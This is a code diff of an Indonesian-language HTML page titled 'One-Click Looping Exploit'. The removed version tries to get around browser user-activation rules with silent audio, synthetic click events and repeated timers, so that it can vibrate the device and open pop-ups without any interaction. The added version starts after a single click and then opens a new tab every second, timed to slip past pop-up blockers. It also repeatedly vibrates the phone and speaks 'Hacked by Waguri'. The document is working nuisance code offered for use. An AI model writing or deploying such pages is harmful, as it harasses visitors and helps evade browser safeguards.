@@ -1,149 +1,84 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Auto Vibration & Pop-up (Race Unlock)</title>
-<style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #0f172a; color: #fff; font-family: 'Segoe UI', sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
-    .panel { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; }
-    h2 { color: #ef4444; margin-bottom: 10px; }
-    p { color: #94a3b8; margin-bottom: 20px; line-height: 1.6; }
-    #status { padding: 12px; background: #111; border-radius: 8px; font-family: monospace; color: #10b981; border: 1px solid #334155; }
-    .hidden { display: none; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>One-Click Looping Exploit</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; cursor: pointer; }
+        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; width: 100%; border: 1px solid #333; }
+        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
+        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
+        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
+    </style>
 </head>
+
 <body>
-
-<div class="panel">
-    <h2>Auto Vibration & Pop-up</h2>
-    <p>Mencoba memicu getaran dan pop-up otomatis tanpa interaksi.</p>
-    <div id="status">Memulai Race Unlock...</div>
+<div class="panel" id="main-panel">
+    <h1>⚠️ ONE-CLICK LOOPING</h1>
+    <p>Klik di mana saja pada layar ini untuk memulai Loop Pop-up, Getar, dan Suara.</p>
+    <div id="status" role="status">Menunggu klik...</div>
 </div>
-
-<audio id="silent1" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
 
 <script>
     const statusDiv = document.getElementById("status");
-    let hasVibrated = false;
-    let hasPoppedUp = false;
+    let isRunning = false;
+    let tabCount = 0;
 
-    // 1. Fungsi Getaran
-    const triggerVibration = () => {
-        if (hasVibrated) return;
-        if ("vibrate" in navigator) {
-            // Pola getar panjang: 1 detik getar, jeda, ulangi
-            const pattern = [1000, 200, 1000, 200, 1000, 500, 500];
-            const result = navigator.vibrate(pattern);
+    // 1. Fungsi Getar & Suara (TTS)
+    function efekHacker() {
+        // Getar (Vibration API)
+        if (navigator.vibrate) {
+            navigator.vibrate([500, 200, 500, 200, 1000]);
+        }
+        
+        // Suara TTS (Text-to-Speech)
+        if ('speechSynthesis' in window) {
+            window.speechSynthesis.cancel();
+            const msg = new SpeechSynthesisUtterance('Hacked by Waguri');
+            msg.lang = 'en-US';
+            msg.rate = 0.9;
+            window.speechSynthesis.speak(msg);
+        }
+    }
+
+    // 2. Fungsi untuk Membuka Tab (Pop-up)
+    function bukaTab() {
+        try {
+            // Buka tab baru ke Google
+            window.open('https://google.com', '_blank');
+            tabCount++;
+            statusDiv.textContent = `Membuka tab ke-${tabCount}...`;
+        } catch (e) {}
+    }
+
+    // 3. Loop Utama (Pemicu setelah klik)
+    function mulaiSerangan() {
+        if (isRunning) return;
+        isRunning = true;
+        
+        statusDiv.textContent = "Sistem Terkunci! Memulai serangan...";
+        statusDiv.style.color = "#ff4444";
+
+        // Pemicu efek pertama (Getar & Suara)
+        efekHacker();
+
+        // Looping Pop-up setiap 1 detik (agar tidak langsung diblokir Pop-up Blocker)
+        setInterval(() => {
+            bukaTab();
             
-            if (result) {
-                hasVibrated = true;
-                statusDiv.textContent = "HP BERGETAR! (Vibration API Berjalan)";
-                statusDiv.style.color = "#10b981";
-                console.log("Vibration triggered successfully.");
-            } else {
-                console.log("Vibration blocked by browser policy.");
+            // Setiap 3 tab, picu getar & suara lagi
+            if (tabCount % 3 === 0) {
+                efekHacker();
             }
-        }
-    };
+        }, 1000); // Jeda 1000ms
+    }
 
-    // 2. Fungsi Pop-up
-    const triggerPopup = () => {
-        if (hasPoppedUp) return;
-        try {
-            // Mencoba membuka tab baru
-            const win = window.open("https://google.com", "_blank");
-            if (win) {
-                hasPoppedUp = true;
-                statusDiv.textContent += " | POP-UP TERBUKA!";
-                statusDiv.style.color = "#3b82f6";
-                console.log("Popup opened successfully.");
-            } else {
-                console.log("Popup blocked by browser policy.");
-            }
-        } catch (e) {
-            console.log("Popup error:", e);
-        }
-    };
-
-    // 3. RACE UNLOCK LOGIC (Teknik dari kode Anda)
-    const raceUnlock = () => {
-        // A. Manipulasi AudioContext untuk memancing "User Activation"
-        try {
-            const ctx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = ctx.createOscillator();
-            osc.frequency.value = 30;
-            const g = ctx.createGain();
-            g.gain.value = 0.001;
-            osc.connect(g);
-            g.connect(ctx.destination);
-            osc.start();
-            
-            if (ctx.state === 'running') {
-                // Jika berhasil running, tembak Getaran & Pop-up
-                triggerVibration();
-                triggerPopup();
-            }
-            if (ctx.state === 'suspended') {
-                ctx.resume().then(() => {
-                    triggerVibration();
-                    triggerPopup();
-                });
-            }
-        } catch(e) {}
-
-        // B. Memancing via Audio Element
-        try {
-            const a1 = document.getElementById('silent1');
-            a1.volume = 0.001;
-            a1.play().then(() => {
-                triggerVibration();
-                triggerPopup();
-            }).catch(() => {});
-        } catch(e) {}
-
-        // C. Force via Synthetic Event (Event Palsu)
-        try {
-            const fakeEvent = new MouseEvent('click', {
-                view: window, bubbles: true, cancelable: true
-            });
-            document.body.dispatchEvent(fakeEvent);
-            
-            // Panggil setelah event palsu
-            triggerVibration();
-            triggerPopup();
-        } catch(e) {}
-    };
-
-    // --- EKSEKUSI BERULANG (Seperti kode Anda) ---
-    raceUnlock();
-    setTimeout(raceUnlock, 50);
-    setTimeout(raceUnlock, 150);
-    setTimeout(raceUnlock, 300);
-    setTimeout(raceUnlock, 500);
-    setTimeout(raceUnlock, 1000);
-
-    // Deteksi jika user kembali ke tab ini
-    document.addEventListener('visibilitychange', () => {
-        if (!document.hidden) {
-            setTimeout(raceUnlock, 50);
-        }
-    });
-
-    // Fallback jika semua gagal
-    setTimeout(() => {
-        if (!hasVibrated) {
-            statusDiv.textContent = "Gagal memicu getaran. (Diblokir Browser)";
-            statusDiv.style.color = "#ef4444";
-        }
-        if (!hasPoppedUp) {
-            console.log("Pop-up diblokir.");
-        }
-    }, 2000);
+    // 4. Event Listener (Hanya butuh SATU klik)
+    document.body.addEventListener('click', function() {
+        mulaiSerangan();
+    }, { once: true }); // Hanya berjalan sekali
 </script>
-
 </body>
 </html>
